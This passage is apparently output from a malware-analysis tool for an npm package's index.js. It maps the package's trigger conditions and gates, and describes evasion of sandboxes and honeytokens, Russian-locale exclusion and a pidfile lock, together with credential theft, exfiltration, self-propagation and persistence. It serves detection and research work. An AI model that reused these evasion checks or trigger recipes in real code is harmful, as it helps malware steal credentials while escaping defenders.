      "api": "process.env.GITHUB_WORKFLOW_REF",
      "operator": "includes",
      "value": "<value of env WORKFLOW_ID>",
      "value_recovered": "plain",
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338544,
            "end_byte": 338578,
            "node_type": "call_expression",
            "sha256": "3b1ce6fdec758ca0",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c25",
      "category": "env_var",
      "api": "process.env.REPO_ID_SUFFIX",
      "operator": "falsy",
      "value": null,
      "value_recovered": "plain",
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338582,
            "end_byte": 338592,
            "node_type": "unary_expression",
            "sha256": "eb7ea3a30f13c6c7",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c26",
      "category": "env_var",
      "api": "process.env.GITHUB_REPOSITORY",
      "operator": "includes",
      "value": "<value of env REPO_ID_SUFFIX>",
      "value_recovered": "plain",
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338594,
            "end_byte": 338628,
            "node_type": "call_expression",
            "sha256": "8f7ac565afd6d826",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c27",
      "category": "env_var",
      "api": "process.env.OIDC_PACKAGES",
      "operator": "truthy",
      "value": null,
      "value_recovered": "plain",
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 326164,
            "end_byte": 326196,
            "node_type": "binary_expression",
            "sha256": "7bd2f04034cdcdb0",
            "line": 1
          }
        }
      ],
      "in_scope": true,
      "provenance": "out_of_set"
    },
    {
      "id": "c28",
      "category": "server_response",
      "api": "fetch",
      "operator": "truthy",
      "value": null,
      "value_recovered": "plain",
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 329146,
            "end_byte": 329300,
            "node_type": "if_statement",
            "sha256": "f2d82f6e1a813120",
            "line": 1
          }
        }
      ],
      "in_scope": false,
      "provenance": "out_of_set"
    }
  ],
  "gates": [
    {
      "gate_id": "g1",
      "hook": "node_gyp_implicit",
      "expression": "c1 && c2 && c3 && c4",
      "guards": [
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338878,
            "end_byte": 338907,
            "node_type": "if_statement",
            "sha256": "b4c4979759eebd46",
            "line": 1
          },
          "kind": "early_exit",
          "arm": "else",
          "conditions": [
            "c1",
            "c2",
            "c3",
            "c4"
          ],
          "via": [
            {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 581226,
              "end_byte": 581236,
              "node_type": "await_expression",
              "sha256": "77786daaafb3f883",
              "line": 1
            }
          ]
        }
      ],
      "polarity": "evade",
      "effect": "enables",
      "purpose": "anti_analysis",
      "purpose_reason": "IX() exits the install when a honeytoken env var (decoy GITHUB_TOKEN/NPM_TOKEN/ANTHROPIC_API_KEY/CIRCLE_TOKEN/AWS_ACCESS_KEY_ID prefix), the decoy GITHUB_REPOSITORY, a known analysis cwd (/tmp/npm-safe/), or a decoy ~/.aws/credentials file are detected, so sandboxes and honeypots see nothing.",
      "then": {
        "behaviours": [
          "recon",
          "cred_read",
          "exfil",
          "self_propagation",
          "persistence"
        ],
        "env_recipe": {
          "env_var_absent": [
            "GITHUB_TOKEN",
            "NPM_TOKEN",
            "ANTHROPIC_API_KEY",
            "CIRCLE_TOKEN",
            "AWS_ACCESS_KEY_ID",
            "GITHUB_REPOSITORY"
          ],
          "file_absent": [
            "~/.aws/credentials"
          ]
        },
        "recipe_guessed_fields": [],
        "regions": [
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 581237,
            "end_byte": 581494,
            "node_type": "lexical_declaration",
            "sha256": "30e36b0f9d98be15",
            "line": 1
          },
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 581494,
            "end_byte": 581556,
            "node_type": "for_in_statement",
            "sha256": "8a9efddf93c5a94d",
            "line": 1
          },
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 581556,
            "end_byte": 581724,
            "node_type": "expression_statement",
            "sha256": "1f254ac2d82dfe66",
            "line": 1
          }
        ],
        "payload": [
          {
            "behaviour": "cred_read",
            "sink_kind": "exec",
            "sink": {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 415355,
              "end_byte": 415433,
              "node_type": "call_expression",
              "sha256": "aac82ccc28f49c23",
              "line": 1
            },
            "witness": [
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 581251,
                  "end_byte": 581261,
                  "node_type": "await_expression",
                  "sha256": "86cd92310201217b",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 565461,
                  "end_byte": 565692,
                  "node_type": "function_declaration",
                  "sha256": "a9926cfd11ee2565",
                  "line": 1
                }
              },
              {
                "hop": "bind",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 565558,
                  "end_byte": 565576,
                  "node_type": "variable_declarator",
                  "sha256": "2336788dc988cbb6",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 565632,
                  "end_byte": 565660,
                  "node_type": "await_expression",
                  "sha256": "264c5f7956adc0d6",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 415089,
                  "end_byte": 415888,
                  "node_type": "method_definition",
                  "sha256": "f4eb24f7548056a0",
                  "line": 1
                }
              }
            ]
          },
          {
            "behaviour": "recon",
            "sink_kind": "other",
            "sink": {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 415593,
              "end_byte": 415604,
              "node_type": "call_expression",
              "sha256": "65010ab91de87884",
              "line": 1
            },
            "witness": [
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 581251,
                  "end_byte": 581261,
                  "node_type": "await_expression",
                  "sha256": "86cd92310201217b",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 565461,
                  "end_byte": 565692,
                  "node_type": "function_declaration",
                  "sha256": "a9926cfd11ee2565",
                  "line": 1
                }
              },
              {
                "hop": "bind",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 565558,
                  "end_byte": 565576,
                  "node_type": "variable_declarator",
                  "sha256": "2336788dc988cbb6",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 565632,
                  "end_byte": 565660,
                  "node_type": "await_expression",
                  "sha256": "264c5f7956adc0d6",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 415089,
                  "end_byte": 415888,
                  "node_type": "method_definition",
                  "sha256": "f4eb24f7548056a0",
                  "line": 1
                }
              }
            ]
          },
          {
            "behaviour": "exfil",
            "sink_kind": "network",
            "sink": {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 576809,
              "end_byte": 577002,
              "node_type": "call_expression",
              "sha256": "44ee3be891afb7bb",
              "line": 1
            },
            "witness": [
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 581666,
                  "end_byte": 581689,
                  "node_type": "call_expression",
                  "sha256": "7dde769c115cc13e",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 212513,
                  "end_byte": 212643,
                  "node_type": "method_definition",
                  "sha256": "3e1067e8c5280b20",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 212587,
                  "end_byte": 212602,
                  "node_type": "call_expression",
                  "sha256": "88eeb538f412a97b",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 212135,
                  "end_byte": 212513,
                  "node_type": "method_definition",
                  "sha256": "98e1c0b91a10033f",
                  "line": 1
                }
              },
              {
                "hop": "bind",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 581459,
                  "end_byte": 581491,
                  "node_type": "pair",
                  "sha256": "0a0b2de5da960cb8",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 212409,
                  "end_byte": 212436,
                  "node_type": "call_expression",
                  "sha256": "93bdf93b776a5a14",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 213320,
                  "end_byte": 214126,
                  "node_type": "field_definition",
                  "sha256": "6c28603be51c0dcc",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 213996,
                  "end_byte": 214024,
                  "node_type": "call_expression",
                  "sha256": "a312c41be6301514",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 575738,
                  "end_byte": 576011,
                  "node_type": "method_definition",
                  "sha256": "fae16ec5376f94e9",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 575978,
                  "end_byte": 576009,
                  "node_type": "call_expression",
                  "sha256": "9a42e4b1c408991e",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 577257,
                  "end_byte": 578299,
                  "node_type": "method_definition",
                  "sha256": "0be3b90a6b49fd0e",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 577859,
                  "end_byte": 577917,
                  "node_type": "call_expression",
                  "sha256": "bf527c9c121862f3",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 576440,
                  "end_byte": 577257,
                  "node_type": "method_definition",
                  "sha256": "8163b380a2710ba0",
                  "line": 1
                }
              }
            ],
            "unresolved": "dynamic_dispatch"
          },
          {
            "behaviour": "self_propagation",
            "sink_kind": "network",
            "sink": {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 190829,
              "end_byte": 190873,
              "node_type": "call_expression",
              "sha256": "6f8a3fe42d91b397",
              "line": 1
            },
            "witness": [
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 581525,
                  "end_byte": 581555,
                  "node_type": "call_expression",
                  "sha256": "33fdfc63df1ac08a",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 208121,
                  "end_byte": 209405,
                  "node_type": "method_definition",
                  "sha256": "2e6049fa858be9ba",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 208812,
                  "end_byte": 208846,
                  "node_type": "call_expression",
                  "sha256": "59172fddafdd9c53",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 210626,
                  "end_byte": 211373,
                  "node_type": "method_definition",
                  "sha256": "7416d11431a7a6dd",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 211228,
                  "end_byte": 211258,
                  "node_type": "call_expression",
                  "sha256": "a0654db4d5c27114",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 188846,
                  "end_byte": 189387,
                  "node_type": "method_definition",
                  "sha256": "f27054003b323908",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 189228,
                  "end_byte": 189261,
                  "node_type": "call_expression",
                  "sha256": "70fcd796a9cf7bcf",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 190691,
                  "end_byte": 190905,
                  "node_type": "method_definition",
                  "sha256": "7fe5e29837551acd",
                  "line": 1
                }
              }
            ]
          },
          {
            "behaviour": "persistence",
            "sink_kind": "fs_write",
            "sink": {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 264916,
              "end_byte": 264977,
              "node_type": "call_expression",
              "sha256": "327eebf9dc4eb153",
              "line": 1
            },
            "witness": [
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 581700,
                  "end_byte": 581723,
                  "node_type": "call_expression",
                  "sha256": "54a2a451492ab531",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 313970,
                  "end_byte": 314733,
                  "node_type": "function_declaration",
                  "sha256": "fee2992f388f6c9e",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 314716,
                  "end_byte": 314720,
                  "node_type": "call_expression",
                  "sha256": "cb2dabdb92a339aa",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 313920,
                  "end_byte": 313970,
                  "node_type": "function_declaration",
                  "sha256": "35e768e015890122",
                  "line": 1
                }
              }
            ],
            "unresolved": "dynamic_dispatch"
          }
        ],
        "min_conditions": 4
      },
      "else": null,
      "provenance": "out_of_set"
    },
    {
      "gate_id": "g2",
      "hook": "node_gyp_implicit",
      "expression": "c5 && c6 && c16",
      "guards": [
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338907,
            "end_byte": 338947,
            "node_type": "if_statement",
            "sha256": "a60dfbe17ded7d90",
            "line": 1
          },
          "kind": "early_exit",
          "arm": "else",
          "conditions": [
            "c5",
            "c6",
            "c16"
          ],
          "via": [
            {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 581226,
              "end_byte": 581236,
              "node_type": "await_expression",
              "sha256": "77786daaafb3f883",
              "line": 1
            }
          ]
        }
      ],
      "polarity": "evade",
      "effect": "enables",
      "purpose": "targeting",
      "purpose_reason": "z7() exits on a Russian locale (Intl locale or LC_ALL/LC_MESSAGES/LANGUAGE/LANG starting with 'ru'), restricting victims to non-RU systems (CIS self-exclusion).",
      "then": {
        "behaviours": [
          "recon",
          "cred_read",
          "exfil",
          "self_propagation",
          "persistence"
        ],
        "env_recipe": {
          "locale": "en-US",
          "env_var": {
            "LANG": "en_US.UTF-8"
          }
        },
        "recipe_guessed_fields": [
          "locale",
          "env_var"
        ],
        "regions": [
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 581237,
            "end_byte": 581494,
            "node_type": "lexical_declaration",
            "sha256": "30e36b0f9d98be15",
            "line": 1
          },
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 581494,
            "end_byte": 581556,
            "node_type": "for_in_statement",
            "sha256": "8a9efddf93c5a94d",
            "line": 1
          },
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 581556,
            "end_byte": 581724,
            "node_type": "expression_statement",
            "sha256": "1f254ac2d82dfe66",
            "line": 1
          }
        ],
        "payload": [
          {
            "behaviour": "cred_read",
            "sink_kind": "exec",
            "sink": {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 415355,
              "end_byte": 415433,
              "node_type": "call_expression",
              "sha256": "aac82ccc28f49c23",
              "line": 1
            },
            "witness": [
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 581251,
                  "end_byte": 581261,
                  "node_type": "await_expression",
                  "sha256": "86cd92310201217b",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 565461,
                  "end_byte": 565692,
                  "node_type": "function_declaration",
                  "sha256": "a9926cfd11ee2565",
                  "line": 1
                }
              },
              {
                "hop": "bind",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 565558,
                  "end_byte": 565576,
                  "node_type": "variable_declarator",
                  "sha256": "2336788dc988cbb6",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 565632,
                  "end_byte": 565660,
                  "node_type": "await_expression",
                  "sha256": "264c5f7956adc0d6",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 415089,
                  "end_byte": 415888,
                  "node_type": "method_definition",
                  "sha256": "f4eb24f7548056a0",
                  "line": 1
                }
              }
            ]
          },
          {
            "behaviour": "recon",
            "sink_kind": "other",
            "sink": {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 415593,
              "end_byte": 415604,
              "node_type": "call_expression",
              "sha256": "65010ab91de87884",
              "line": 1
            },
            "witness": [
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 581251,
                  "end_byte": 581261,
                  "node_type": "await_expression",
                  "sha256": "86cd92310201217b",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 565461,
                  "end_byte": 565692,
                  "node_type": "function_declaration",
                  "sha256": "a9926cfd11ee2565",
                  "line": 1
                }
              },
              {
                "hop": "bind",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 565558,
                  "end_byte": 565576,
                  "node_type": "variable_declarator",
                  "sha256": "2336788dc988cbb6",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 565632,
                  "end_byte": 565660,
                  "node_type": "await_expression",
                  "sha256": "264c5f7956adc0d6",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 415089,
                  "end_byte": 415888,
                  "node_type": "method_definition",
                  "sha256": "f4eb24f7548056a0",
                  "line": 1
                }
              }
            ]
          },
          {
            "behaviour": "exfil",
            "sink_kind": "network",
            "sink": {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 576809,
              "end_byte": 577002,
              "node_type": "call_expression",
              "sha256": "44ee3be891afb7bb",
              "line": 1
            },
            "witness": [
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 581666,
                  "end_byte": 581689,
                  "node_type": "call_expression",
                  "sha256": "7dde769c115cc13e",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 212513,
                  "end_byte": 212643,
                  "node_type": "method_definition",
                  "sha256": "3e1067e8c5280b20",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 212587,
                  "end_byte": 212602,
                  "node_type": "call_expression",
                  "sha256": "88eeb538f412a97b",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 212135,
                  "end_byte": 212513,
                  "node_type": "method_definition",
                  "sha256": "98e1c0b91a10033f",
                  "line": 1
                }
              },
              {
                "hop": "bind",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 581459,
                  "end_byte": 581491,
                  "node_type": "pair",
                  "sha256": "0a0b2de5da960cb8",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 212409,
                  "end_byte": 212436,
                  "node_type": "call_expression",
                  "sha256": "93bdf93b776a5a14",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 213320,
                  "end_byte": 214126,
                  "node_type": "field_definition",
                  "sha256": "6c28603be51c0dcc",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 213996,
                  "end_byte": 214024,
                  "node_type": "call_expression",
                  "sha256": "a312c41be6301514",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 575738,
                  "end_byte": 576011,
                  "node_type": "method_definition",
                  "sha256": "fae16ec5376f94e9",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 575978,
                  "end_byte": 576009,
                  "node_type": "call_expression",
                  "sha256": "9a42e4b1c408991e",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 577257,
                  "end_byte": 578299,
                  "node_type": "method_definition",
                  "sha256": "0be3b90a6b49fd0e",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 577859,
                  "end_byte": 577917,
                  "node_type": "call_expression",
                  "sha256": "bf527c9c121862f3",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 576440,
                  "end_byte": 577257,
                  "node_type": "method_definition",
                  "sha256": "8163b380a2710ba0",
                  "line": 1
                }
              }
            ],
            "unresolved": "dynamic_dispatch"
          },
          {
            "behaviour": "self_propagation",
            "sink_kind": "network",
            "sink": {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 190829,
              "end_byte": 190873,
              "node_type": "call_expression",
              "sha256": "6f8a3fe42d91b397",
              "line": 1
            },
            "witness": [
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 581525,
                  "end_byte": 581555,
                  "node_type": "call_expression",
                  "sha256": "33fdfc63df1ac08a",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 208121,
                  "end_byte": 209405,
                  "node_type": "method_definition",
                  "sha256": "2e6049fa858be9ba",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 208812,
                  "end_byte": 208846,
                  "node_type": "call_expression",
                  "sha256": "59172fddafdd9c53",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 210626,
                  "end_byte": 211373,
                  "node_type": "method_definition",
                  "sha256": "7416d11431a7a6dd",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 211228,
                  "end_byte": 211258,
                  "node_type": "call_expression",
                  "sha256": "a0654db4d5c27114",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 188846,
                  "end_byte": 189387,
                  "node_type": "method_definition",
                  "sha256": "f27054003b323908",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 189228,
                  "end_byte": 189261,
                  "node_type": "call_expression",
                  "sha256": "70fcd796a9cf7bcf",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 190691,
                  "end_byte": 190905,
                  "node_type": "method_definition",
                  "sha256": "7fe5e29837551acd",
                  "line": 1
                }
              }
            ]
          },
          {
            "behaviour": "persistence",
            "sink_kind": "fs_write",
            "sink": {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 264916,
              "end_byte": 264977,
              "node_type": "call_expression",
              "sha256": "327eebf9dc4eb153",
              "line": 1
            },
            "witness": [
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 581700,
                  "end_byte": 581723,
                  "node_type": "call_expression",
                  "sha256": "54a2a451492ab531",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 313970,
                  "end_byte": 314733,
                  "node_type": "function_declaration",
                  "sha256": "fee2992f388f6c9e",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 314716,
                  "end_byte": 314720,
                  "node_type": "call_expression",
                  "sha256": "cb2dabdb92a339aa",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 313920,
                  "end_byte": 313970,
                  "node_type": "function_declaration",
                  "sha256": "35e768e015890122",
                  "line": 1
                }
              }
            ],
            "unresolved": "dynamic_dispatch"
          }
        ],
        "min_conditions": 3
      },
      "else": null,
      "provenance": "out_of_set"
    },
    {
      "gate_id": "g3",
      "hook": "node_gyp_implicit",
      "expression": "c7 || c15",
      "guards": [
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 339004,
            "end_byte": 339103,
            "node_type": "if_statement",
            "sha256": "0d2f9c75b2642bb9",
            "line": 1
          },
          "kind": "early_exit",
          "arm": "else",
          "conditions": [
            "c7",
            "c15"
          ],
          "via": [
            {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 581226,
              "end_byte": 581236,
              "node_type": "await_expression",
              "sha256": "77786daaafb3f883",
              "line": 1
            }
          ]
        }
      ],
      "polarity": "activate",
      "effect": "enables",
      "purpose": "unclear",
      "purpose_reason": "yX() is a single-instance/reinfection guard: it aborts when a pidfile lock (<tmpdir>/tmp.0144018410.lock) already exists and names a live process; otherwise it writes its own pid and proceeds. Phase 2 must ensure the lock is absent.",
      "then": {
        "behaviours": [
          "recon",
          "cred_read",
          "exfil",
          "self_propagation",
          "persistence"
        ],
        "env_recipe": {
          "file_absent": [
            "/tmp/tmp.0144018410.lock"
          ]
        },
        "recipe_guessed_fields": [
          "file_absent"
        ],
        "regions": [
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 581237,
            "end_byte": 581494,
            "node_type": "lexical_declaration",
            "sha256": "30e36b0f9d98be15",
            "line": 1
          },
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 581494,
            "end_byte": 581556,
            "node_type": "for_in_statement",
            "sha256": "8a9efddf93c5a94d",
            "line": 1
          },
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 581556,
            "end_byte": 581724,
            "node_type": "expression_statement",
            "sha256": "1f254ac2d82dfe66",
            "line": 1
          }
        ],
        "payload": [
          {
            "behaviour": "cred_read",
            "sink_kind": "exec",
            "sink": {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 415355,
              "end_byte": 415433,
              "node_type": "call_expression",
              "sha256": "aac82ccc28f49c23",
              "line": 1
            },
            "witness": [
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 581251,
                  "end_byte": 581261,
                  "node_type": "await_expression",
                  "sha256": "86cd92310201217b",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 565461,
                  "end_byte": 565692,
                  "node_type": "function_declaration",
                  "sha256": "a9926cfd11ee2565",
                  "line": 1
                }
              },
              {
                "hop": "bind",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 565558,
                  "end_byte": 565576,
                  "node_type": "variable_declarator",
                  "sha256": "2336788dc988cbb6",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 565632,
                  "end_byte": 565660,
                  "node_type": "await_expression",
                  "sha256": "264c5f7956adc0d6",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 415089,
                  "end_byte": 415888,
                  "node_type": "method_definition",
                  "sha256": "f4eb24f7548056a0",
                  "line": 1
                }
              }
            ]
          },
          {
            "behaviour": "recon",
            "sink_kind": "other",
            "sink": {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 415593,
              "end_byte": 415604,
              "node_type": "call_expression",
              "sha256": "65010ab91de87884",
              "line": 1
            },
            "witness": [
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 581251,
                  "end_byte": 581261,
                  "node_type": "await_expression",
                  "sha256": "86cd92310201217b",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 565461,
                  "end_byte": 565692,
                  "node_type": "function_declaration",
                  "sha256": "a9926cfd11ee2565",
                  "line": 1
                }
              },
              {
                "hop": "bind",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
